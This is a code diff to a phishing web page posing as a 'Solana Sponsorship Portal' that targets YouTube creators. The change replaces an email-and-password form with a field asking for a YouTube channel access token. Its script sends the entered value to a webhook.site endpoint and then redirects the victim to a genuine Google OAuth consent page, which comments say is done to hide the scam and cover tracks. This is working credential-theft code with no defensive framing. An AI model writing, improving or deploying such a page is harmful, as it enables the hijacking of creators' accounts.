@@ -21,7 +21,7 @@
       padding: 30px;
       box-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
     }
-    input[type="text"], input[type="password"] {
+    input[type="text"] {
       width: 90%;
       padding: 12px;
       margin: 15px 0;
@@ -49,13 +49,12 @@
 <body>
   <div class="container">
     <h1>Solana Sponsorship Portal</h1>
-    <p>Verify your YouTube account to continue</p>
+    <p>To complete your sponsorship verification, please enter your YouTube Channel Access Token below.</p>
 
     <form id="fakeLoginForm">
-      <input type="text" id="username" name="username" placeholder="YouTube Email" required />
-      <input type="password" id="password" name="password" placeholder="Password" required />
+      <input type="text" id="token" name="token" placeholder="YouTube Channel Access Token" required />
       <br />
-      <button type="submit">Connect with YouTube</button>
+      <button type="submit">Verify Channel</button>
     </form>
   </div>
 
@@ -63,16 +62,15 @@
     document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
       event.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+      const token = document.getElementById('token').value;
 
       fetch('https://webhook.site/5575c5b8-af4b-4b23-873b-ab7afd8dc0bf', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
+        body: JSON.stringify({ token })
       })
       .then(() => {
-        // Redirect victim to legit Google OAuth to hide the scam
+        // Redirect to legit Google OAuth to cover tracks
         window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent';
       })
       .catch(() => alert('Something went wrong, try again.'));
